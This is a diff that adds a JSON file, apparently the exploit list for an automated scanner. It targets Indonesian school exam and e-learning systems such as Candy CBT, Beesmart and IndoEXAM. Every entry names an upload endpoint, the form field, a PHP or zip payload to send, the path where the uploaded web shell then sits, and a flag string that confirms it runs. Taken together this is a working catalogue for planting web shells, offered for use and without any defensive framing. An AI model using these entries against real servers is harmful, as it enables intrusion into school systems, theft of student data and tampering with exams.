@@ -1,0 +1,317 @@
+{
+    "author": "withmasday",
+    "updated": "01/08/2023",
+    "cms": "Computer Based Test",
+    "exploit": [
+        {
+            "name": "Candy SKL",
+            "slug": "candyskl",
+            "method": "POST", 
+            "path": "/admin/upload.php",
+            "attachment": "candyskl0x0.zip",
+            "access": [
+                "/foto_siswa/candyskl0x0.php",
+                "/foto_siswa/candyskl0x0/candyskl0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [
+                {
+                    "params": "btn_zip",
+                    "value": "Eksekusi!!"
+                }
+            ],
+            "csrf": "zip_file"
+        },
+        {
+            "name": "Candy CBT 01",
+            "slug": "candycbt01",
+            "method": "POST", 
+            "path": "/admin/soal/import_file.php",
+            "attachment": "candyskl0x0.zip",
+            "access": [
+                "/files/candyskl0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "zip_file"
+        },
+        {
+            "name": "Candy CBT 02",
+            "slug": "candycbt02",
+            "method": "POST", 
+            "path": "/plugins/uploadfile/demo/upload.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/plugins/uploadfile/demo/uploads/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "myfile"
+        },
+        {
+            "name": "Candy CBT 03",
+            "slug": "candycbt03",
+            "method": "POST", 
+            "path": "/plugins/uploadfile/php/upload.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/plugins/uploadfile/php/uploads/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "myfile"
+        },
+        {
+            "name": "OnUjian CBT",
+            "slug": "onujian",
+            "method": "POST", 
+            "path": "/on-admin/ujiansql.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/on-admin/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "files"
+        },
+        {
+            "name": "ARSIP",
+            "slug": "arsip",
+            "method": "POST", 
+            "path": "/petugas/arsip_aksi.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/arsip/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [
+                {
+                    "params": "submit",
+                    "value": "Upload"
+                }
+            ],
+            "csrf": "file"
+        },
+        {
+            "name": "E-Learning",
+            "slug": "elearning",
+            "method": "POST", 
+            "path": "/?hal=daftar",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/img/foto_siswa/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [
+                {
+                    "params": "daftar",
+                    "value": "UPLOAD!!"
+                }
+            ],
+            "csrf": "gambar"
+        },
+        {
+            "name": "CBT Restore",
+            "slug": "cbtrestore",
+            "method": "POST", 
+            "path": "/admin/restore.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "datafile"
+        },
+        {
+            "name": "CandyCBTv27",
+            "slug": "candycbtv27",
+            "method": "POST", 
+            "path": "/admin/?pg=uplfotosiswa",
+            "attachment": "candyskl0x0.zip",
+            "access": [
+                "/foto/fotosiswa/candyskl0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [
+                {
+                    "params": "uplod",
+                    "value": ""
+                }
+            ],
+            "csrf": "zip_file"
+        },
+        {
+            "name": "Beesmart Banner",
+            "slug": "beesmartbanner",
+            "method": "POST", 
+            "path": "/panel/pages/upload-banner.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/images/trustsec0x0.php",
+                "/panel/pages/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile1"
+        },
+        {
+            "name": "Beesmart Logo",
+            "slug": "beesmartlogo",
+            "method": "POST", 
+            "path": "/panel/pages/upload-logo.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/images/trustsec0x0.php",
+                "/panel/pages/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile5"
+        },
+        {
+            "name": "Beesmart Header",
+            "slug": "beesmartheader",
+            "method": "POST", 
+            "path": "/panel/pages/upload-header.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/images/trustsec0x0.php",
+                "/panel/pages/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile4"
+        },
+        {
+            "name": "IndoEXAM Slide 1",
+            "slug": "indoexamslide1",
+            "method": "POST", 
+            "path": "/admin/action/slide1.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile5"
+        },
+        {
+            "name": "IndoEXAM Slide 2",
+            "slug": "indoexamslide2",
+            "method": "POST", 
+            "path": "/admin/action/slide2.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile6"
+        },
+        {
+            "name": "IndoEXAM Slide 3",
+            "slug": "indoexamslide3",
+            "method": "POST", 
+            "path": "/admin/action/slide3.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile7"
+        },
+        {
+            "name": "IndoEXAM Slide 4",
+            "slug": "indoexamslide4",
+            "method": "POST", 
+            "path": "/admin/action/slide4.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile8"
+        },
+        {
+            "name": "IndoEXAM Slide 5",
+            "slug": "indoexamslide5",
+            "method": "POST", 
+            "path": "/admin/action/slide5.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile9"
+        },
+        {
+            "name": "IndoEXAM Uploadfile",
+            "slug": "indoexamuploadfile",
+            "method": "POST", 
+            "path": "/admin/action/upload-file.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile"
+        },
+        {
+            "name": "IndoEXAM Foto Kepsek",
+            "slug": "indoexamfotokep",
+            "method": "POST", 
+            "path": "/admin/action/uploadfotokep.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile41"
+        },
+        {
+            "name": "IndoEXAM Banner",
+            "slug": "indoexambanner",
+            "method": "POST", 
+            "path": "/admin/action/uploadbanner.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile4"
+        },
+        {
+            "name": "IndoEXAM Uploadfile 3",
+            "slug": "indoexamuploadfile3",
+            "method": "POST", 
+            "path": "/admin/action/uploadfile.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile3"
+        },
+        {
+            "name": "IndoEXAM Upload TTD Kepsek",
+            "slug": "indoexamttdkep",
+            "method": "POST", 
+            "path": "/admin/action/uploadttdkep.php",
+            "attachment": "trustsec0x0.php",
+            "access": [
+                "/admin/images/trustsec0x0.php"
+            ],
+            "flag": "trustsec0x0777",
+            "data": [],
+            "csrf": "uploadfile42"
+        }
+    ]
+}
